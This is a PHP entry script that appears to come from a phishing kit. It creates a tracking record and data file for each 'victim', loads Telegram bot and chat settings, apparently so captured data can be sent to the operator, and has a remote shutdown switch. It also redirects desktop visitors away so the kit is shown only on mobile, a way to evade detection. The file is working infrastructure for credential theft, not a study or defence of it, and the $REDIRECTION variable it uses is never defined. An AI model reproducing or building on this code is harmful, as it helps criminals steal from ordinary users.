<?php 
@session_start();

$ajaxPath = "../panel/classes/processor.php";
require (__DIR__).'/panel/classes/mother.class.php';
require (__DIR__).'/panel/classes/admin.class.php';

// Change this line - now pointing to admin.php instead of admin.json
$admin_php_file = (__DIR__).'/panel/data/api.php';
 
$ip = $_SERVER['REMOTE_ADDR'];
if($ip=="::1"){
	$ip="127.0.0.1";
}

$m = new Mother;
$vicFile = $m->getFileId();
$m->createVic();
$m->setDataFile($vicFile);

// Load settings from PHP file instead of JSON
$admin_settings = include $admin_php_file;

// Extract settings directly from the PHP array
$a_bot = $admin_settings["settings"]["telegram_bot"];
$a_ids = $admin_settings["settings"]["telegram_id"];
$block_pc = $admin_settings["settings"]["pc_block"];
$shutdown = $admin_settings["settings"]["shutdown"];
$notifs = $admin_settings["settings"]["notifications"];

if($shutdown==1){
	exit;
}

require (__DIR__).'/lib/md.php';
$d = new Mobile_Detect;
if(!$d->isMobile() and $block_pc==1){
	exit(header("location: $REDIRECTION"));
}

?>